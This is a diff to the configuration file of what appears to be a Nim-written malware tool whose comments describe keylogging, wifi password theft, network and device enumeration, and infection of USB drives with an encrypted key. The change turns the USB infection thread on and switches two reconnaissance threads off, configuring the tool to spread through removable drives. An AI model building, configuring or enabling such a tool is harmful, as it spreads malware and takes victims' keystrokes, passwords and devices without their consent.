@@ -29,7 +29,7 @@ const USE_WIFI_PASSWORDS_THREAD*: bool = false
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
 ## DEFAULT: true
-const USE_CONNECTED_WIFI_THREAD*: bool = true
+const USE_CONNECTED_WIFI_THREAD*: bool = false
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
@@ -58,7 +58,7 @@ const UNSAFE_REMOVE_FILE*: bool = false
 
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
-const USE_INFECT_THREAD*: bool = false
+const USE_INFECT_THREAD*: bool = true
 
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
@@ -68,7 +68,7 @@ const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
 ## connectedDevicesThread is used for getting all the connected
 ## devices on a wifi network
 ## DEFAULT: true
-const USE_CONNECTED_DEVICES_THREAD*: bool = true
+const USE_CONNECTED_DEVICES_THREAD*: bool = false
 
 ## the number of threads connectedDevicesThread will use
 ## to check ips
